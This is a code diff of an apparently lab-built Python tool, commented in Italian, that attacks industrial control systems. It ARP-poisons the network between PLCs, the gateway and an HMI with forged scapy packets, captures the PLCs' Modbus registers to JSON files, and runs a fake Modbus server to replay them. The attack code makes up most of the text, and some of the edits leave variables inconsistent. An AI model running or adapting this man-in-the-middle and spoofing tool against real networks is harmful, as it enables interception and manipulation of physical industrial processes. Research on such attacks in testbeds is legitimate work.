@@ -38,7 +38,7 @@ def get_mac(ip):
     arp_response, unanswered = sr(ARP(op="who-has", psrc='172.17.0.1', pdst=ip))
     print("stampa unanswered", unanswered)
     #sniff(prn=p, filter="arp", store=False)
-    print(arp_response)
+    print("stampa response", arp_response)
     # Estrai l'indirizzo MAC dalla risposta
     if arp_response:
         return arp_response[0][1].hwsrc
@@ -53,17 +53,19 @@ def arp_poison(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac):
         print("Failed to retrieve MAC addresses of PLCs or HMI.")
         return
     # Aggiungi la cattura dei pacchetti ARP
-    #sniff(prn=handle_arp_packet, filter="arp", store=False)
+    # sniff(prn=handle_arp_packet, filter="arp", store=False)
     while True:
         for plc_mac in plc_macs:
             target_packet = ARP(op=2, pdst=target_ip, hwdst=plc_mac, psrc=gateway_ip, hwsrc=attacker_mac)
-            #print("target_packet", target_packet)
+            print("target_packet", target_packet)
             gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=plc_mac, psrc=target_ip, hwsrc=attacker_mac)
-            #print("gateway_packet", gateway_packet)
+            print("gateway_packet", gateway_packet)
             sendp(target_packet, verbose=False)
             sendp(gateway_packet, verbose=False)
 
         time.sleep(2)
+        #break
+    print("HO FINITO")
 
 class ModbusServer(threading.Thread):
     def __init__(self, ip, port, json_files):
@@ -103,17 +105,15 @@ def parse_config_file(config_file):
 
     plc_ips = []
     plc_ports = []
-    plc_names = []
     hmi_ip = config.get("Network", "hmi_ip")
     hmi_port = config.get("Network", "hmi_port")
 
     for section in config.sections():
         if section.startswith('PLC'):
-            plc_names.append(section[3:])
             plc_ips.append(config.get(section, 'ip'))
             plc_ports.append(config.get(section, 'port'))
 
-    return plc_names, plc_ips, plc_ports, hmi_ip, hmi_port
+    return plc_ips, plc_ports, hmi_ip, hmi_port
 
 @ray.remote
 def read_registers(name, ip, port, master, types_of_registers):
@@ -123,9 +123,14 @@ def read_registers(name, ip, port, master, types_of_registers):
         single_plc_registers[ip]['DiscreteInputRegisters'] = read_di(master)
     if 'InputRegisters' in types_of_registers:
         single_plc_registers[ip]['InputRegisters'] = read_ir(master)
-    # Aggiungi qui la lettura degli altri tipi di registri necessari
+    if 'Coils' in types_of_registers:
+        single_plc_registers[ip]['Coils'] = read_c(master)
+    if 'MemoryRegister' in types_of_registers:
+        single_plc_registers[ip]['MemoryRegister'] = read_mr(master)
+    if 'HoldingRegister' in types_of_registers:
+        single_plc_registers[ip]['HoldingRegister'] = read_hr(master)
 
-    with open(f'historian/{name}.json', 'w') as sp:
+    with open(f'registerCapture/historian/{name}.json', 'w') as sp:
         sp.write(json.dumps(single_plc_registers, indent=4))
 
 def capture_registers(plc_names, plc_ips, plc_ports):
@@ -137,7 +142,7 @@ def capture_registers(plc_names, plc_ips, plc_ports):
             master.set_timeout(5.0)
             master = modbus_tcp.TcpMaster(host=ip, port=int(port))
             masters.append(master)
-            executor.submit(read_registers, name, ip, port, master, ['DiscreteInputRegisters', 'InputRegisters'])
+            executor.submit(read_registers, plc_names, ip, port, master, ['DiscreteInputRegisters', 'InputRegisters', 'Coils', 'MemoryRegister', 'HoldingRegister'])
     ray.shutdown()
 
 def read_c(master):
@@ -223,30 +228,24 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('--plc', nargs='+', help='IP addresses of PLCs to attack')
     parser.add_argument('--time', type=int, help='Capture duration in minutes')
-    parser.add_argument('--prefix', nargs='+', help='Prefixes for JSON file selection, containing PLC info')
     parser.add_argument('--manual', action='store_true', help='Manually start the Modbus slaves')
     parser.add_argument('--condition', type=str, help='Condition to start the capture')
     args = parser.parse_args()
-
-    if not args.plc:
-        print('Please provide the IP addresses of the PLCs to attack')
-        return
 
     if not args.time:
         print('Please provide the capture duration')
         return
 
-    prefixes = args.prefix
-
+    prefixes = args.plc
     config_file = "config.ini"
 
     config = configparser.ConfigParser()
     config.read(config_file)
 
-    plc_names, plc_ips, plc_ports, hmi_ip, hmi_port = parse_config_file(config_file)
+    plc_ips, plc_ports, hmi_ip, hmi_port = parse_config_file(config_file)
 
     print("Config file:", config_file)
-    print("plc_names:", plc_names)
+    # print("plc_names:", prefixes)
     print("plc_ips:", plc_ips)
     print("plc_ports:", plc_ports)
     print("hmi_ip", hmi_ip)
@@ -259,11 +258,11 @@ def main():
         json_files.extend(glob.glob(os.path.join(directory, f"{prefix}*.json")))
 
     if not json_files:
-        print('No JSON files found with the specified prefixes')
+        print('No PLC or JSON files found with the specified prefixes')
         return
 
     server_ip = '0.0.0.0'
-    server_port = 508
+    server_port = 510
 
     server = ModbusServer(server_ip, server_port, json_files)
 
@@ -291,7 +290,7 @@ def main():
                 if args.condition == 'start':
                     capture_duration = args.time * 60  # Capture duration in seconds
                     capture_started_event = threading.Event()
-                    capture_thread = threading.Thread(target=start_capture, args=(capture_duration, capture_started_event, server, plc_names, plc_ips, plc_ports))
+                    capture_thread = threading.Thread(target=start_capture, args=(capture_duration, capture_started_event, server, prefixes, plc_ips, plc_ports))
                     capture_thread.start()
                     server.capture_duration = capture_duration
                     server.capture_started = capture_started_event
